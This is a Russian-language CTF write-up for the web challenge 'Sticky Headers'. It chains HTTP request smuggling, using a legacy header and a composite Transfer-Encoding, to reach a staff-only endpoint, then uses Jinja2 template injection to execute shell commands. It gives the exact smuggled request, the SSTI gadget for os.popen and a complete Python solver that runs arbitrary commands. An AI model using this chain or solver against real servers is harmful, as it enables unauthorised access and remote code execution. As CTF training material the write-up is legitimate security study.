# Sticky Headers - разбор (HTTP request smuggling + Jinja2 SSTI)

## Знакомство с задачей

Исходников не выдали - только живой инстанс. Поэтому первый шаг - разведка: найти эндпоинты, понять, что каждый делает, и посмотреть на подсказку в описании.

Сайт - кондитерская. Две роли:

- **публичная** `/order` - `POST /order` оформляет заказ (`message=...`) и отвечает "Order received!".
- **staff** `/staff/preview` - рендерит шаблон из поля `message`, но прямой запрос возвращает **403**.

Подсказка из задания: *"Older couriers may describe delivery contents using more than one encoding."* Вместе с названием **Sticky Headers** это указывает на HTTP request smuggling: кто-то перед staff-эндпоинтом разбирает запросы иначе, чем сам staff-сервис, а составная кодировка (больше одного `Transfer-Encoding`) - классический способ заставить два парсера разойтись.

## Чем я пользовался (инструменты)

- `nc` / маленький Python-клиент по TLS - чтобы говорить с инстансом и видеть сырые ответы.
- Свои probe-скрипты (`scripts/`) - чтобы перебрать, какая комбинация `X-Client-Version` + `Transfer-Encoding` заставляет два парсера разойтись.
- Ручные запросы в стиле curl - для поведения прямых эндпоинтов (403/404).

## Шаг 1: добраться до `/staff/preview` через смаглинг

Прямой `POST /staff/preview` возвращает `403` - staff-эндпоинт что-то проверяет (скорее всего заголовок `X-Client-Version` / роль клиента).

Находка: с **`X-Client-Version: 1`** плюс составной **`Transfer-Encoding: gzip, chunked`** на **первом** запросе к `/order` сервер обрабатывает **второй HTTP-запрос** в том же соединении. Значит, мы можем смаглить свежий запрос к `/staff/preview` и получить `200`.

Почему это работает (рассинхрон): фронтовый прокси видит `Transfer-Encoding: gzip, chunked` и (не поддерживая gzip) заканчивает разбор тела на chunked-фрейминге; внутренний сервис трактует составной TE иначе и считает байты после первого тела началом следующего запроса. Итог: два запроса в одном соединении, и второй попадает в staff-обработчик без staff-проверки.

Триггерный заголовок важен: с `X-Client-Version: 2` (или без него) второй запрос НЕ обрабатывается. `X-Client-Version: 1` - это путь «легаси-клиента», который фронтовый прокси обрабатывает иначе (на это же намекает «older couriers»).

Точный рабочий запрос (воспроизведён побайтово из probe #070, лежит в `evidence/smuggle_working_070.request`):

```text
POST /order HTTP/1.1
Host: <host>
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: gzip, chunked

B
order=hello
0

POST /staff/preview HTTP/1.1
Host: <host>
Connection: keep-alive
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

message=%7B%7B7%2A7%7D%7D
```

Заметки:
- Первый запрос: chunked-тело `order=hello`, затем chunked-терминатор `0\r\n\r\n`; внутренний запрос дописывается после трейлера.
- `B` - размер чанка: 0xB = 11 = длина `order=hello`.
- Внутренний запрос попадает во внутренний обработчик (по баннеру сервера - `BaseHTTP/0.6 Python/3.12.15`).

Результат: два ответа на одном соединении:

```text
HTTP/1.1 200 OK   Order received!           (443 B)
HTTP/1.0 200 OK   Staff template preview    (740 B)   .preview = 49
```

Второй ответ отрендерил `{{7*7}}` как `49` - мы добрались до шаблонного движка. (Зафиксировано в `evidence/smuggle_working_070.response`.)

Правила, подтверждённые перебором:

| Внешний | Внутренний `/staff/preview` | Результат |
|---|---|---|
| `X-Client-Version: 1` + `TE: gzip, chunked` | POST `message=...` | два ответа, staff рендерит |
| `X-Client-Version: 2` | POST | только один ответ, staff нет |
| прямой `/staff/preview` | - | **403** |
| внутренний GET `/staff/preview` | - | 404 |

## Шаг 2: шаблонный движок - Jinja2 (SSTI)

Staff-рендерер рендерит наш `message` как шаблон. Сначала я проверил, какой это движок:

- `{{7*7}}` = `49` - базовое вычисление выражений,
- `{{"a".upper()}}` = `ABC` - вызовы методов работают,
- `{{cycler}}` = `jinja2.utils.Cycler` - доступен встроенный глобал Jinja2,
- `{{lipsum}}` = функция, `{{self}}` = `<TemplateReference None>`.

Это подтверждает **Jinja2** и даёт классический SSTI-гаджет: добраться до Python-модуля через глобалы Jinja и вызвать `os.popen`:

```text
{{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
```

Таблица подтверждений (из `sticky_staff_inspector.py`, сохранена в `evidence/staff_inspector_summary.json`):

| Выражение | Вывод |
|---|---|
| `{{7*7}}` | `49` |
| `{{4+5}}`, `{{9-5}}`, `{{9/3}}`, `{{9%4}}`, `{{2**5}}` | `9`, `4`, `3.0`, `1`, `32` |
| `{{"abc".upper()}}` | `ABC` |
| `{{"foo".replace("o","i")}}` | `fii` |
| `{{().__class__.__mro__}}` | `(<class 'tuple'>, <class 'object'>)` |
| `{{cycler.__init__.__globals__.os}}` | модуль `os` |
| `{{cycler.__init__.__globals__.os.getcwd()}}` | `/challenge` |
| `{{cycler.__init__.__globals__.os.listdir("/challenge")}}` | `['src']` |

### Поиск и чтение флага

```text
{{cycler.__init__.__globals__.os.popen("ls /").read()}}                 # список корня
{{cycler.__init__.__globals__.os.popen("find / -name recipe.txt").read()}}
# -> /opt/candy/recipe.txt
#    /tmp/recipe.txt
# /opt/candy/recipe.txt - симлинк на /tmp/recipe.txt

{{cycler.__init__.__globals__.os.popen("cat /opt/candy/recipe.txt").read()}}
# -> FortID{1_C4NT_5H4K3_TH15_H34D3R_...}   (замаскирован)
```

Флаг лежит в `/opt/candy/recipe.txt` (симлинк на `/tmp/recipe.txt`), по тематике - «кондитерский рецепт».

## Рабочий клиент (scripts/solve.py)

Без сторонних зависимостей, TLS из стандартной библиотеки:

```python
#!/usr/bin/env python3
"""Sticky Headers (FortID) - HTTP request smuggling + Jinja2 SSTI, flag read.

The public /order endpoint accepts a legacy client ("X-Client-Version: 1") with a
composite "Transfer-Encoding: gzip, chunked"; the front proxy and the internal
service disagree about the body, so a second HTTP request smuggled in the same
connection reaches the staff-only /staff/preview, which renders our message as a
Jinja2 template. From there it is a plain cycler.__init__.__globals__.os.popen RCE.

Usage:
    python3 solve.py <host> [port]                      # full chain, flag
    python3 solve.py <host> --expr '{{7*7}}'            # one template probe
    python3 solve.py <host> --cmd 'id'                  # one shell command
"""

import argparse
import re
import socket
import ssl
import sys
import urllib.parse

PREVIEW_RE = re.compile(rb'<div class="preview">(.*?)</div>', re.S)
FLAG_RE = re.compile(r"FortID\{[^}]{0,200}\}")


def build_request(host, message):
    """The exact two-request-on-one-connection payload (byte-for-byte from probe #070)."""
    data = urllib.parse.urlencode({"message": message}).encode()
    outer = (
        f"POST /order HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n"
        f"Transfer-Encoding: gzip, chunked\r\n"
        f"\r\n"
        f"B\r\norder=hello\r\n0\r\n\r\n"
    ).encode()
    inner = (
        f"POST /staff/preview HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"\r\n"
    ).encode() + data
    return outer + inner


def send(host, port, payload, timeout=8.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=timeout) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ss:
            ss.settimeout(4)
            ss.sendall(payload)
            raw = b""
            try:
                while True:
                    chunk = ss.recv(65536)
                    if not chunk:
                        break
                    raw += chunk
            except (socket.timeout, ssl.SSLError, OSError):
                pass
    return raw


def preview(host, port, message):
    """Render `message` on the smuggled /staff/preview and return the preview text."""
    raw = send(host, port, build_request(host, message))
    match = PREVIEW_RE.search(raw)
    return match.group(1).decode("utf-8", "replace") if match else None


def rce(host, port, command):
    expr = '{{cycler.__init__.__globals__.os.popen("' + command + '").read()}}'
    return preview(host, port, expr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", nargs="?", type=int, default=1337)
    ap.add_argument("--expr", help="render a single template expression")
    ap.add_argument("--cmd", help="run a single shell command through os.popen")
    args = ap.parse_args()

    if args.expr:
        print(preview(args.host, args.port, args.expr))
        return 0
    if args.cmd:
        print(rce(args.host, args.port, args.cmd))
        return 0

    control = preview(args.host, args.port, "{{7*7}}")
    print(f"[*] smuggling control ({{{{7*7}}}}) - {control!r}")
    if control != "49":
        print("[!] the smuggled request did not reach the template renderer")
        return 1

    found = rce(args.host, args.port, "find / -name recipe.txt")
    print(f"[*] find / -name recipe.txt - {found!r}")

    paths = [p for p in (found or "").split() if p.endswith("recipe.txt")]
    for path in paths:
        out = rce(args.host, args.port, f"cat {path}")
        print(f"[*] cat {path} - {out!r}")
        flag = FLAG_RE.search(out or "")
        if flag:
            print(f"\nFLAG: {flag.group(0)}")
            return 0

    print("[!] no flag in the rendered output")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Проверено офлайн: `build_request(host, '{{7*7}}')` совпадает с `evidence/smuggle_working_070.request` байт в байт (456 байт) - ровно тот запрос, который дал `preview">49` на живом сервере.

## Проверка

Инстанс закрыт после соревнования, поэтому живой прогон сейчас невозможен. Что доказано:

- `evidence/smuggle_working_070.request` (456 Б) - рабочий смаглинговый запрос, побайтово.
- `evidence/smuggle_working_070.response` - два HTTP-ответа на одном соединении; второй - staff-страница с `preview">49`, то есть смагленный запрос дошёл до шаблонного рендерера.
- `evidence/staff_inspector_summary.json` - таблица подтверждённых SSTI-выражений (арифметика, вызовы методов, глобалы, модуль os).
- офлайн: `build_request()` воспроизводит рабочий запрос байт в байт.

Сырой ответ с финальным флагом снимался ad-hoc клиентом и в папку не попал (задокументировано в README); значение флага взято из того запуска.

## Тупики (что я пробовал сначала)

1. **Прямой запрос к `/staff/preview`.** Возвращает `403` - staff-эндпоинт отвергает прямых клиентов; в этом весь смысл смаглинга.
2. **`X-Client-Version: 2`.** Фронтовый прокси не обрабатывает второй запрос; только легаси-путь `1` имеет рассинхрон разбора.
3. **Внутренний GET к `/staff/preview`.** Возвращает 404 - staff-эндпоинт принимает только POST с телом `message`.
4. **`Transfer-Encoding: chunked` сам по себе.** Рассинхрона нет; именно составной `gzip, chunked` заставляет парсеры разойтись.

## Версия в один абзац

Sticky Headers - веб-задача с защищённым `/staff/preview` (отдаёт 403), который рендерит Jinja2-шаблон из нашего `message`. Используя `X-Client-Version: 1` плюс составной `Transfer-Encoding: gzip, chunked` на публичном запросе `/order`, фронтовый прокси и внутренний сервис расходятся в разборе тела, так что второй запрос, смагленный в том же соединении, доходит до `/staff/preview` и рендерится (доказательство: `{{7*7}}` = 49 во втором ответе). Рендерер - Jinja2, поэтому классический гаджет `{{cycler.__init__.__globals__.os.popen(<CMD>).read()}}` даёт RCE: `find / -name recipe.txt` находит `/opt/candy/recipe.txt` (симлинк на `/tmp/recipe.txt`), и `cat` по нему возвращает флаг.

## Уроки

1. Составной `Transfer-Encoding` (`gzip, chunked`) - надёжный примитив request smuggling, когда фронтовый прокси и бэкенд по-разному его трактуют; «легаси-клиентский» заголовок (`X-Client-Version: 1`) был триггером, включившим рассинхрон.
2. Когда эндпоинт рендерит пользовательский ввод, сначала прощупай шаблонный движок (`{{7*7}}`, `.upper()`, `cycler`) - ответ задаёт весь путь эксплуатации (здесь Jinja2 - SSTI - RCE).
3. Классический Jinja2-гаджет `{{<builtin>.__init__.__globals__.os.popen(<cmd>).read()}}` - самый быстрый путь от инъекции шаблона к исполнению кода.
4. Побайтовые доказательства важны: сохранение точного рабочего запроса (probe #070) делает эксплойт воспроизводимым офлайн и после смерти инстанса.
5. Подсказка («more than one encoding») была буквальной: составной TE-заголовок и есть уязвимость. Читай флейвор-текст как технический указатель.

## Файлы

- `scripts/solve.py` - финальный клиент: смаглинг + SSTI (host [port] / --expr / --cmd)
- `scripts/sticky_staff_inspector.py` - перебор SSTI-выражений, сбор подтверждений
- `scripts/sticky_headers_desync.py` - проверка рассинхрона TE-заголовков
- `scripts/sticky_headers_v1_probe.py` - перебор X-Client-Version / TE (нашёл #070)
- `evidence/` - рабочий запрос, его ответ, таблица подтверждений SSTI